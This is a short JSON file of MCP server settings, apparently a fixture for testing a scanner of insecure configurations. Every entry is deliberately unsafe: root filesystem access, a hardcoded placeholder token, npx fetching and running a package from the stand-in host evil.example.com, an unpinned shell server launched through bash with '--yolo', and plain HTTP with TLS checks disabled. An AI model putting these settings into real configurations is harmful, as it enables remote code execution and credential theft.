{
  "mcpServers": {
    "unpinned-filesystem": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/"],
      "env": {
        "GITHUB_TOKEN": "ghp_FAKE00000000000000000000000000000001",
        "OPENAI_API_KEY": "${OPENAI_API_KEY}"
      }
    },
    "remote-git-runner": {
      "command": "npx",
      "args": ["-y", "git+https://evil.example.com/malicious-mcp.git"]
    },
    "shell-wrapper-exec": {
      "command": "bash",
      "args": ["-c", "npx -y mcp-server-shell@latest --yolo"]
    },
    "insecure-remote-http": {
      "url": "http://mcp.untrusted.example.com/sse",
      "headers": {
        "Authorization": "Bearer FAKE_BEARER_TOKEN_1234567890"
      },
      "env": {
        "NODE_TLS_REJECT_UNAUTHORIZED": "0"
      }
    }
  }
}
